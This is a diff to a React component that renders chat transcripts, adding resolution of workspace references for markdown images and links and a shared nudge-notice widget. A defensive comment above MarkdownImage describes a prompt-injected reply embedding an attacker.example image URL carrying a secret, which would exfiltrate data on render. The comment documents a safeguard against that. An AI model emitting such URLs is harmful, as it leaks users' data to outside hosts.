@@ -8,11 +8,13 @@ import { Copy, Check } from 'lucide-react';
 import { formatTimestamp, formatNumber } from '../utils/formatters';
 import { getModelDisplayName } from '../constants/models';
 import { API_BASE_URL } from '../api/config';
-import { conversationSource, fileDownloadUrl, projectSource } from '../api/fileApi';
-import type { MessageContent, ToolUseMessage as ToolUseMessageType, ToolResultMessage as ToolResultMessageType, StatsMessage as StatsMessageType, ErrorMessage as ErrorMessageType, InterruptedMessage as InterruptedMessageType, ActionRequestMessage as ActionRequestMessageType, ConnectRequestMessage as ConnectRequestMessageType, CompactionMessage as CompactionMessageType, ModelFallbackMessage as ModelFallbackMessageType, RoutineNudgeMessage as RoutineNudgeMessageType, ComposerAttachmentRef } from '../api/types';
+import { conversationSource, fileDownloadUrl, projectSource, autoprojectSource, type FileSource } from '../api/fileApi';
+import { isWorkspaceRef, parseWorkspaceRef, type WorkspaceRef } from '../utils/workspaceRefs';
+import type { MessageContent, ToolUseMessage as ToolUseMessageType, ToolResultMessage as ToolResultMessageType, StatsMessage as StatsMessageType, ErrorMessage as ErrorMessageType, InterruptedMessage as InterruptedMessageType, ActionRequestMessage as ActionRequestMessageType, ConnectRequestMessage as ConnectRequestMessageType, CompactionMessage as CompactionMessageType, ModelFallbackMessage as ModelFallbackMessageType, RoutineNudgeMessage as RoutineNudgeMessageType, AutoProjectQuestionTranscriptMessage, AutoProjectNudgeMessage as AutoProjectNudgeMessageType, ComposerAttachmentRef } from '../api/types';
 import { ToolUseMessage } from './ToolUseMessage';
 import { ActionRequestMessage } from './ActionRequestMessage';
 import { ConnectRequestMessage } from './ConnectRequestMessage';
+import { AutoProjectQuestionMessage } from './autoprojects/AutoProjectQuestionMessage';
 import { webSocketManager } from '../services/WebSocketManager';
 import './Message.css';
 
@@ -158,34 +160,56 @@ export function CopyableTable({ children, ...props }: React.HTMLAttributes<HTMLT
 }
 
 /**
- * Context giving the shared markdown renderer the conversation whose
- * workspace image paths (`![alt](chart.png)`) should resolve against, plus
- * an optional click-to-enlarge handler. A context (rather than a
- * components-factory taking conversationId) keeps `markdownComponents` a
- * stable module constant, so the React.memo on MessageContentRenderer
- * still holds.
+ * Context giving the shared markdown renderer the file spaces its
+ * references resolve against, plus an optional click-to-open handler. A
+ * context (rather than a components-factory taking conversationId) keeps
+ * `markdownComponents` a stable module constant, so the React.memo on
+ * MessageContentRenderer still holds.
+ *
+ * Two kinds of reference resolve to a space's cookie-authed files/download
+ * route:
+ * - a bare relative path (`![alt](chart.png)`, `[r](reports/q3.pdf)`)
+ *   resolves against the host's own space: `conversationId`, else
+ *   `projectId`, else `autoprojectId` (one is set by the FileViewerModal .md
+ *   preview of a Project files / AutoProject files entry);
+ * - a space reference in the file tools' grammar (utils/workspaceRefs.ts)
+ *   resolves against its own id: `chat://` against `conversationId`,
+ *   `proj://` against `projectId`, `autoproject://` against `autoprojectId`. Without that
+ *   id it resolves nothing: the link keeps its href as written, the image
+ *   shows as a missing ref and is never fetched.
  *
  * `assetBase` switches image resolution to a Quest Doc's asset store (the
  * doc viewer sets it to `docAssetBase(docId)`): `assets/<name>` maps to
- * `<assetBase>/<name>`, every other relative src is a missing ref, and
- * `conversationId` is ignored. Link hrefs of the `assets/<name>` form
- * resolve the same way (other hrefs are untouched).
+ * `<assetBase>/<name>`, every other relative src is a missing ref, and the
+ * space ids are ignored. Link hrefs of the `assets/<name>` form resolve the
+ * same way (other hrefs are untouched).
  *
- * Outside a doc, a relative link href is a workspace path too: its href
- * becomes the files/download URL of the same space as images, and a plain
- * click hands the path to `onOpenFile` (the host's in-app viewer) when set.
+ * A resolved link's href is the download URL (copy-link and modifier
+ * clicks still work), and a plain click -- like a click on a resolved
+ * image -- hands the path and its space to `onOpenFile` (the host's in-app
+ * viewer) when set.
  */
 export interface MarkdownWorkspaceContextValue {
+  /** The conversation workspace: bare paths and `chat://` refs. */
   conversationId?: string;
   /**
-   * Resolve bare paths against a project's shared workspace instead (the
-   * FileViewerModal .md preview of a Project Files entry). Ignored when
-   * `assetBase` or `conversationId` is set; chat never sets it.
+   * A project's shared workspace: `proj://` refs, and bare paths when no
+   * `conversationId` is set (the FileViewerModal .md preview of a Project
+   * Files entry). A project conversation sets it beside `conversationId`.
    */
   projectId?: string;
+  /**
+   * An AutoProject's workspace: `autoproject://` refs, and bare paths when neither
+   * `conversationId` nor `projectId` is set (the .md preview of an AutoProject files
+   * entry). An AutoProject run's markdown sets it beside the run's `conversationId`.
+   */
+  autoprojectId?: string;
   assetBase?: string;
-  /** Open a workspace file in the host's viewer: inline images on click, relative links on a plain click. */
-  onOpenFile?: (workspacePath: string, filename: string) => void;
+  /**
+   * Open a workspace file in the host's viewer: inline images on click,
+   * resolved links on a plain click. `source` is the space the path is in.
+   */
+  onOpenFile?: (workspacePath: string, filename: string, source: FileSource) => void;
 }
 
 export const MarkdownWorkspaceContext = React.createContext<MarkdownWorkspaceContextValue>({});
@@ -221,67 +245,140 @@ function docAssetUrl(path: string, assetBase: string): string | null {
   return asset ? `${assetBase}/${encodeURIComponent(asset[1])}` : null;
 }
 
+/** The space a bare relative path resolves against (see the context doc). */
+function bareSource(ctx: MarkdownWorkspaceContextValue): FileSource | null {
+  if (ctx.conversationId) return conversationSource(ctx.conversationId);
+  if (ctx.projectId) return projectSource(ctx.projectId);
+  if (ctx.autoprojectId) return autoprojectSource(ctx.autoprojectId);
+  return null;
+}
+
 /**
- * Markdown `img` renderer: workspace-relative srcs are rewritten to the
- * cookie-authed files/download endpoint of the surrounding conversation,
- * so the model can embed workspace images inline with plain markdown.
- * Inside a doc (`assetBase` set) only `assets/<name>` srcs resolve, to the
- * doc's cookie-authed asset route.
+ * The space a `chat://` / `proj://` / `autoproject://` reference names, when
+ * the context knows its id.
+ */
+function refSource(ref: WorkspaceRef, ctx: MarkdownWorkspaceContextValue): FileSource | null {
+  switch (ref.scheme) {
+    case 'chat':
+      return ctx.conversationId ? conversationSource(ctx.conversationId) : null;
+    case 'proj':
+      return ctx.projectId ? projectSource(ctx.projectId) : null;
+    case 'autoproject':
+      return ctx.autoprojectId ? autoprojectSource(ctx.autoprojectId) : null;
+  }
+}
+
+/** A reference resolved to a file of some space. */
+interface ResolvedWorkspaceFile {
+  source: FileSource;
+  path: string;
+}
+
+/**
+ * Resolve a link href or image src outside a doc: a space reference
+ * against its own id, a bare relative path against the host's space.
+ * `unresolved` is a space reference whose id the context lacks; `external`
+ * an absolute URL (or `#anchor` for links); `none` a bare path with no space.
+ */
+function resolveWorkspaceFile(
+  ref: string,
+  ctx: MarkdownWorkspaceContextValue,
+): ResolvedWorkspaceFile | 'unresolved' | 'external' | 'none' {
+  const spaceRef = parseWorkspaceRef(ref);
+  if (spaceRef) {
+    const source = refSource(spaceRef, ctx);
+    return source && spaceRef.path ? { source, path: spaceRef.path } : 'unresolved';
+  }
+  if (EXTERNAL_SRC_RE.test(ref)) return 'external';
+  const source = bareSource(ctx);
+  const path = normalizeMarkdownPath(ref);
+  return source && path ? { source, path } : 'none';
+}
+
+function fileName(path: string): string {
+  return path.split('/').pop() || path;
+}
+
+/**
+ * Markdown `img` renderer: workspace-relative srcs and space references
+ * (`autoproject://chart.png`) are rewritten to the cookie-authed files/download
+ * endpoint of their space (MarkdownWorkspaceContext), so the model can
+ * embed workspace images inline with plain markdown. Inside a doc
+ * (`assetBase` set) only `assets/<name>` srcs resolve, to the doc's
+ * cookie-authed asset route.
  *
  * External srcs are NEVER auto-fetched: an `<img>` fires its request the
  * moment the transcript renders, so a prompt-injected reply embedding
  * `https://attacker.example/p.png?<secret>` would exfiltrate data with no
  * user interaction. They degrade to a plain click-through link instead
  * (the same user-initiated exposure ordinary markdown links already have).
+ * Workspace routes are same-origin and the user's own, so loading those is
+ * safe; a space reference the context cannot resolve is a missing ref.
  */
 function MarkdownImage({ src, alt }: React.ImgHTMLAttributes<HTMLImageElement>) {
-  const { conversationId, projectId, assetBase, onOpenFile } = React.useContext(MarkdownWorkspaceContext);
+  const ctx = React.useContext(MarkdownWorkspaceContext);
+  const { assetBase, onOpenFile } = ctx;
   // Track the failing URL rather than a boolean: during streaming an image
   // ref can render with a truncated src that 404s, then re-render complete.
   const [failedSrc, setFailedSrc] = useState<string | null>(null);
 
   if (!src || typeof src !== 'string') return null;
 
-  if (EXTERNAL_SRC_RE.test(src)) {
-    return (
-      <a href={src} target="_blank" rel="noopener noreferrer" className="markdown-image-external">
-        {alt || src}
-      </a>
-    );
-  }
-
-  // Decoded here, re-encoded as a query param / path segment below.
-  const path = normalizeMarkdownPath(src);
-
   let url: string | null = null;
+  let file: ResolvedWorkspaceFile | null = null;
+  let label: string;
   if (assetBase) {
-    url = docAssetUrl(path, assetBase);
-  } else if (conversationId) {
-    url = fileDownloadUrl(conversationSource(conversationId), path);
-  } else if (projectId) {
-    url = fileDownloadUrl(projectSource(projectId), path);
+    // A doc resolves no space references: they show as missing refs.
+    if (isWorkspaceRef(src)) {
+      label = src;
+    } else if (EXTERNAL_SRC_RE.test(src)) {
+      return <ExternalImageLink src={src} alt={alt} />;
+    } else {
+      label = normalizeMarkdownPath(src);
+      url = docAssetUrl(label, assetBase);
+    }
+  } else {
+    const resolved = resolveWorkspaceFile(src, ctx);
+    if (resolved === 'external') return <ExternalImageLink src={src} alt={alt} />;
+    if (typeof resolved === 'object') {
+      file = resolved;
+      label = resolved.path;
+      url = fileDownloadUrl(resolved.source, resolved.path);
+    } else {
+      label = resolved === 'unresolved' ? src : normalizeMarkdownPath(src);
+    }
   }
 
   if (!url || failedSrc === url) {
     return (
-      <code className="markdown-image-missing" title={path}>
-        {alt || path}
+      <code className="markdown-image-missing" title={label}>
+        {alt || label}
       </code>
     );
   }
 
   const img = <img src={url} alt={alt || ''} loading="lazy" onError={() => setFailedSrc(url)} />;
-  if (!onOpenFile) return img;
-  const filename = path.split('/').pop() || path;
+  if (!onOpenFile || !file) return img;
+  const { source, path } = file;
+  const filename = fileName(path);
   return (
     <button
       type="button"
       className="markdown-image-button"
-      onClick={() => onOpenFile(path, filename)}
+      onClick={() => onOpenFile(path, filename, source)}
       title={`Open ${filename}`}
     >
       {img}
     </button>
+  );
+}
+
+/** An external image src, shown as a click-through link instead of loaded. */
+function ExternalImageLink({ src, alt }: { src: string; alt?: string }) {
+  return (
+    <a href={src} target="_blank" rel="noopener noreferrer" className="markdown-image-external">
+      {alt || src}
+    </a>
   );
 }
 
@@ -292,34 +389,32 @@ function MarkdownImage({ src, alt }: React.ImgHTMLAttributes<HTMLImageElement>) 
  * rule as images; every other href is left as written.
  *
  * Outside a doc, a relative href (`[note](note.txt)`, `[r](reports/q3.pdf)`)
- * is a workspace path, resolved like image srcs: the href becomes the
- * cookie-authed files/download URL so copy-link and modifier-clicks still
+ * and a space reference (`[notes](autoproject://notes.md)`) are workspace paths,
+ * resolved like image srcs: the href becomes the cookie-authed
+ * files/download URL of their space so copy-link and modifier-clicks still
  * work, and a plain click opens the file through `onOpenFile` instead of a
- * new tab when the host provides it. Absolute URLs and `#anchors` are left
- * alone.
+ * new tab when the host provides it. Absolute URLs, `#anchors` and space
+ * references the context cannot resolve are left alone.
  */
 function MarkdownLink({ children, href, ...props }: React.AnchorHTMLAttributes<HTMLAnchorElement>) {
-  const { conversationId, projectId, assetBase, onOpenFile } = React.useContext(MarkdownWorkspaceContext);
+  const ctx = React.useContext(MarkdownWorkspaceContext);
+  const { assetBase, onOpenFile } = ctx;
   let resolved = href;
   let onClick: React.MouseEventHandler<HTMLAnchorElement> | undefined;
-  if (typeof href === 'string' && href && !EXTERNAL_SRC_RE.test(href) && !href.startsWith('#')) {
-    const path = normalizeMarkdownPath(href);
+  if (typeof href === 'string' && href && !href.startsWith('#')) {
     if (assetBase) {
-      resolved = docAssetUrl(path, assetBase) ?? href;
+      if (!EXTERNAL_SRC_RE.test(href)) resolved = docAssetUrl(normalizeMarkdownPath(href), assetBase) ?? href;
     } else {
-      const source = conversationId
-        ? conversationSource(conversationId)
-        : projectId
-          ? projectSource(projectId)
-          : null;
-      if (source && path) {
+      const file = resolveWorkspaceFile(href, ctx);
+      if (typeof file === 'object') {
+        const { source, path } = file;
         resolved = fileDownloadUrl(source, path);
         if (onOpenFile) {
           onClick = (e) => {
             // Modifier / middle clicks keep the browser's own new-tab behaviour.
             if (e.button !== 0 || e.metaKey || e.ctrlKey || e.shiftKey || e.altKey) return;
             e.preventDefault();
-            onOpenFile(path, path.split('/').pop() || path);
+            onOpenFile(path, fileName(path), source);
           };
         }
       }
@@ -329,6 +424,32 @@ function MarkdownLink({ children, href, ...props }: React.AnchorHTMLAttributes<H
     <a {...props} href={resolved} onClick={onClick} target="_blank" rel="noopener noreferrer">
       {children}
     </a>
+  );
+}
+
+/**
+ * The notice of a follow-up turn the server ran because a routine or an
+ * AutoProject run ended without calling its completion tool: the text, the
+ * time, and the exact prompt the model received in the tooltip. `kind`
+ * names its classes (`message-<kind>-nudge`, `<kind>-nudge-*`, Message.css).
+ */
+function NudgeNotice({
+  kind,
+  message,
+  text,
+}: {
+  kind: 'routine' | 'autoproject';
+  message: RoutineNudgeMessageType | AutoProjectNudgeMessageType;
+  text: string;
+}) {
+  return (
+    <div className={`message-${kind}-nudge`} title={message.content || undefined}>
+      <span className={`${kind}-nudge-icon`} aria-hidden="true">&#8635;</span>
+      <span className={`${kind}-nudge-text`}>{text}</span>
+      <span className={`${kind}-nudge-timestamp`}>
+        {message.timestamp ? formatTimestamp(message.timestamp) : ''}
+      </span>
+    </div>
   );
 }
 
@@ -446,6 +567,11 @@ export const MessageContentRenderer = React.memo(function MessageContentRenderer
   // Inline connect card (request_service_connection)
   if (message.type === 'connect_request') {
     return <ConnectRequestMessage message={message as ConnectRequestMessageType} />;
+  }
+
+  // An AutoProject run's question to the user (ask_autoproject_question)
+  if (message.type === 'autoproject_question') {
+    return <AutoProjectQuestionMessage message={message as AutoProjectQuestionTranscriptMessage} />;
   }
 
   // Handle tool_use messages
@@ -639,17 +765,27 @@ export const MessageContentRenderer = React.memo(function MessageContentRenderer
   // model to verify its work and finish (see chat/routine_runs.py). The
   // exact text the model received is in the tooltip.
   if (message.type === 'routine_nudge') {
-    const nudgeMsg = message as RoutineNudgeMessageType;
     return (
-      <div className="message-routine-nudge" title={nudgeMsg.content || undefined}>
-        <span className="routine-nudge-icon" aria-hidden="true">&#8635;</span>
-        <span className="routine-nudge-text">
-          Routine run ended without calling routine_completed — asked the model to check its work and finish
-        </span>
-        <span className="routine-nudge-timestamp">
-          {nudgeMsg.timestamp ? formatTimestamp(nudgeMsg.timestamp) : ''}
-        </span>
-      </div>
+      <NudgeNotice
+        kind="routine"
+        message={message as RoutineNudgeMessageType}
+        text="Routine run ended without calling routine_completed — asked the model to check its work and finish"
+      />
+    );
+  }
+
+  // Handle autoproject-nudge notices - an AutoProject run's turn ended without
+  // complete_autoproject_run (or with its brief conflict unsettled) and the server
+  // ran one follow-up turn asking the model to finish the run and hand off
+  // (see chat/autoprojects/runs.py). The exact text the model received is in the
+  // tooltip.
+  if (message.type === 'autoproject_nudge') {
+    return (
+      <NudgeNotice
+        kind="autoproject"
+        message={message as AutoProjectNudgeMessageType}
+        text="The update did not finish — asked the model to call complete_autoproject_run and hand off"
+      />
     );
   }
 
